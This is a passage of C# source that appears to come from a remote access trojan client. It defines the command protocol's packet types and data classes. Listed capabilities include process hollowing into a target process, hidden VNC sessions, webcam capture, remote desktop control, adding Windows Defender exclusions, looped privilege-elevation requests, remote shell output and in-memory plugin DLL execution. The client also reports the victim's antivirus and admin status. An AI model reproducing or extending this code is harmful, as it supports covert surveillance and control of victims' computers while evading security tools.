    Uninstall = 22,
    HollowExec = 23,
    UpdateClient = 24,
    RequestElevation = 30,
    RequestElevationLoop = 31,
    Ping = 32,
    Pong = 33,
    ActiveWindow = 34,
    CameraStatus = 35,

    RdpStart = 50,
    RdpStop = 51,
    RdpFrame = 52,
    RdpInput = 53,
    RdpClipboard = 54,
    RdpFrameAck = 55,
    RdpGetMonitors = 56,

    WcamStart = 60,
    WcamStop = 61,
    WcamFrame = 62,
    WcamDevices = 63,

    DefenderExclude = 70,
    PluginExec = 71,

    AutoTaskShell = 80,
    AutoTaskShellOutput = 81,

    HvncStart    = 100,
    HvncStop     = 101,
    HvncFrame    = 102,
    HvncFrameAck = 103,
    HvncInput    = 104,
    HvncExec     = 105,
}

internal class Packet
{
    public PacketType Type { get; set; }
    public string Data { get; set; } = string.Empty;
    public long Timestamp { get; set; } = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
}

internal class ClientInfoData
{
    public string OS { get; set; } = string.Empty;
    public string Username { get; set; } = string.Empty;
    public string MachineName { get; set; } = string.Empty;
    public string Hwid { get; set; } = string.Empty;
    public string IP { get; set; } = string.Empty;
    public string Payload { get; set; } = string.Empty;
    public string AuthKey { get; set; } = string.Empty;
    public bool IsAdmin { get; set; }
    public string Antivirus { get; set; } = string.Empty;
    public string IdPrefix { get; set; } = string.Empty;
    public string InstanceId { get; set; } = string.Empty;
}

internal class ShellOutputData
{
    public string Output { get; set; } = string.Empty;
    public int ExitCode { get; set; }
}

internal class RemoteFileExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

internal class UpdateClientData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

internal class HollowExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
    public string TargetProcess { get; set; } = string.Empty;
}

internal class PluginExecData
{
    public string DllBase64 { get; set; } = string.Empty;
    public string ExportName { get; set; } = "PluginMain";
}

internal class ElevationResultData
{
    public bool Success { get; set; }
    public string Message { get; set; } = string.Empty;
}

internal class RdpStartDataStub
{
    public int Quality   { get; set; } = 90;
    public int Fps       { get; set; } = 20;
    public int Monitor   { get; set; } = 0;
    public int Scale     { get; set; } = 100;
    public bool Mouse    { get; set; } = true;
    public bool Keyboard { get; set; } = true;
    public bool Clipboard{ get; set; } = true;
}

internal class WcamStartDataStub
{
    public int DeviceIndex { get; set; } = 0;
    public int Quality { get; set; } = 55;
    public int Fps { get; set; } = 15;
}

internal class HvncStartDataStub
{
    public int Quality { get; set; } = 75;
    public int Fps     { get; set; } = 20;
    public int Width   { get; set; } = 1280;
    public int Height  { get; set; } = 720;
}

internal class HvncFrameDataStub
{
    public int    W { get; set; }
    public int    H { get; set; }
    public string J { get; set; } = string.Empty;
}

internal class HvncInputDataStub
{
    public string T          { get; set; } = string.Empty;
    public int    X          { get; set; }
    public int    Y          { get; set; }
    public int    Button     { get; set; }
    public bool   Down       { get; set; }
    public int    WheelDelta { get; set; }
    public int    VK         { get; set; }
}

internal class HvncExecDataStub
{
    public string Path { get; set; } = string.Empty;
}

// ── JSON Source Generator (NativeAOT compatible) ────

[JsonSerializable(typeof(Packet))]
[JsonSerializable(typeof(ClientInfoData))]
[JsonSerializable(typeof(ShellOutputData))]
[JsonSerializable(typeof(RemoteFileExecData))]
[JsonSerializable(typeof(UpdateClientData))]
[JsonSerializable(typeof(HollowExecData))]
[JsonSerializable(typeof(PluginExecData))]
[JsonSerializable(typeof(ElevationResultData))]
[JsonSerializable(typeof(RdpStartDataStub))]
[JsonSerializable(typeof(WcamStartDataStub))]
[JsonSerializable(typeof(HvncStartDataStub))]
[JsonSerializable(typeof(HvncFrameDataStub))]
[JsonSerializable(typeof(HvncInputDataStub))]
[JsonSerializable(typeof(HvncExecDataStub))]
internal partial class SeroJson : JsonSerializerContext { }
